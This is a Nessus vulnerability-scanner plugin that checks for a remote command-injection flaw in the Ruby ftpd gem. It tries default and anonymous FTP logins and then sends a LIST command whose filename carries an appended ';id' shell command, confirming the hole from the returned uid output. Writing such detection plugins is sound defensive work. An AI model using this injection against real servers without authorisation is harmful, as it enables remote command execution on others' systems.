#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(65078);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_bugtraq_id(58279);
  script_osvdb_id(90784);

  script_name(english:"Ruby ftpd Gem 'filename' Parameter Remote Command Execution");
  script_summary(english:"Attempts to exploit flaw and run 'id' command.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host is running an FTP server that is affected by a code
injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"Nessus was able to exploit a code injection vulnerability in the Ruby
ftpd Gem by providing a specially crafted 'filename' parameter to the
LIST command."
  );
  script_set_attribute(attribute:"see_also", value:"http://otiose.dhs.org/advisories/ftp-0.2.1-remote-exec.html");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2013/Mar/10");
  # https://github.com/wconrad/ftpd/commit/828064f1a0ab69b2642c59cab8292a67bb44182c
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b3b462e4");
  script_set_attribute(attribute:"solution", value:"Upgrade to ftpd gem 0.2.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/02/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/03/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/03/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:wconrad:ftpd");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_keys("ftp/login");
  script_require_ports("Services/ftp", 21);
  
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

port = get_ftp_port(default:21);
encaps = get_port_transport(port);

banner = chomp(get_ftp_banner(port:port));
if (!banner) audit(AUDIT_NO_BANNER, port);
if ('220 ftpd' != banner) audit(AUDIT_NOT_DETECT, "Ruby ftpd", port);

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

is_auth = 0;

login = get_kb_item("ftp/login");
if (login)
{
  password = get_kb_item("ftp/password");
  if (isnull(password))
  {
     if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);
     password = 'nessus@' + get_host_name();
  }

  is_auth = ftp_authenticate(socket:soc, user:login, pass:password);
}

# Stop here if supplied_logins_only and auth failed.
if (!is_auth && supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# try anonymous
if (!is_auth)
{
  password = 'nessus@' + get_host_name();
  is_auth = ftp_authenticate(socket:soc, user:'anonymous', pass:password);
}

# try example.rb creds
if (!is_auth) is_auth = ftp_authenticate(socket:soc, user:'root', pass:'');

if (!is_auth)
{
  close(soc);
  exit(0, "Unable to authenticate to remote FTP server on port " + port + ".");
}

port2 = ftp_pasv(socket:soc);
if (!port2) exit(1, "PASV command failed on port "+port+".");
soc2 = open_sock_tcp(port2, transport:encaps);
if (!soc2) exit(1, "Failed to open a socket on PASV port "+port2+".");

ftp_send_cmd(socket:soc, cmd:'LIST ' + rand() + ';id');

r = ftp_recv_line(socket:soc);
vuln = FALSE;
command_result = '';

if (r =~  "^226")
{
  res = ftp_recv_listing(socket:soc2);
  #uid=0(root) gid=0(root) groups=0(root)
  if ("uid=" >< res && "gid=" >< res)
  {
    vuln = TRUE;
    command_result = chomp(res);
  }
}

if (vuln)
{
  if (report_verbosity > 0)
  {
    report = '\nNessus was able to execute the \'id\' command with the following'+
             '\nresult : \n\n' + command_result + '\n';
    security_hole(extra:report, port:port);
  }
  else security_hole(port);
}
else audit(AUDIT_LISTEN_NOT_VULN, "ftpd", port);
